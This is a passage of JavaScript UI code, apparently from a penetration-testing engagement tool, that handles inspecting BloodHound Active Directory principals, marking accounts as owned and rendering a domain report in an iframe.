      var eng = OBOL.store.active(), slot = document.getElementById('bh-inspect-slot');
      if (!eng || !eng.bloodhound || !slot || !principal) return;
      _inspecting = principal;
      var owned = ownedFromEngagement();
      slot.innerHTML = inspectHtml(principal, eng.bloodhound, owned, cmdCtxFor(principal));
      var sel = document.getElementById('bh-inspect');
      if (sel && sel.value !== principal) { try { sel.value = principal; } catch (x) {} }
      try { slot.scrollIntoView({ block: 'nearest' }); } catch (x) {}
    }
    U.on(mount, 'click', '[data-explore]', function (e, t) { e.preventDefault(); doInspect(t.getAttribute('data-explore')); });
    var sel = document.getElementById('bh-inspect');
    if (sel) sel.addEventListener('change', function () {
      var v = sel.value;
      if (!v) { var slot = document.getElementById('bh-inspect-slot'); if (slot) slot.innerHTML = ''; _inspecting = null; return; }
      doInspect(v);
    });

    // "I Own This Account Now" (door one of three): add/remove the principal in eng.bloodhound.ownedExtra,
    // re-render so the whole tab (route, graph, gating) reflects the new owned set, then restore the card.
    U.on(mount, 'change', '.bh-own-check', function (e, c) {
      var who = c.getAttribute('data-own'); if (!who) return;
      var on = c.checked, key = String(who).split('@')[0].toUpperCase();
      OBOL.store.update(function (eng) {
        eng.bloodhound = eng.bloodhound || {};
        var set = (eng.bloodhound.ownedExtra || []).filter(function (x) { return String(x).split('@')[0].toUpperCase() !== key; });
        if (on) set.push(who);
        eng.bloodhound.ownedExtra = set;
      }, 'bloodhound-owned');
      U.toast(on ? ('Marked ' + shortName(who) + ' as owned') : ('Unmarked ' + shortName(who)));
      OBOL.router.render();
    });

    // "+ N more" reveals the hidden sibling list/board and drops the button.
    U.on(mount, 'click', '.bh-more-btn', function (e, b) {
      var more = b.previousElementSibling;
      while (more && !(more.classList && more.classList.contains('bh-more'))) more = more.previousElementSibling;
      if (more) more.hidden = false;
      b.remove();
    });

    var rep = document.getElementById('bh-report');
    if (rep) rep.addEventListener('click', function () {
      var eng = OBOL.store.active();
      if (!eng.bloodhound) return;
      var owned = ownedFromEngagement();
      var view = OBOL.bloodhound.domainView(eng.bloodhound, owned, cmdCtx(owned, false));
      var htmlDoc = OBOL.bloodhound.domainReportHtml(eng.bloodhound, view);
      var slot = document.getElementById('bh-report-slot');
      if (slot) slot.innerHTML = '<h2 class="coach-sec-h">Domain report</h2><iframe class="bh-report-frame" id="bh-frame"></iframe>';
      var frame = document.getElementById('bh-frame');
      if (frame) frame.srcdoc = htmlDoc;
    });

    // Restore the inspect card after a re-render (e.g. ticking "I Own This"), if it still exists.
    if (_inspecting && document.getElementById('bh-inspect-slot')) {
      var still = OBOL.bloodhound.principalList((OBOL.store.active() || {}).bloodhound || {}, {})
        .some(function (p) { return shortName(p.name).toUpperCase() === shortName(_inspecting).toUpperCase(); });
      if (still) doInspect(_inspecting); else _inspecting = null;
    }
  }

  OBOL.routes = OBOL.routes || {};
  OBOL.routes.domain = { render: render, mounted: mounted };
})(typeof globalThis !== 'undefined' ? globalThis : this);
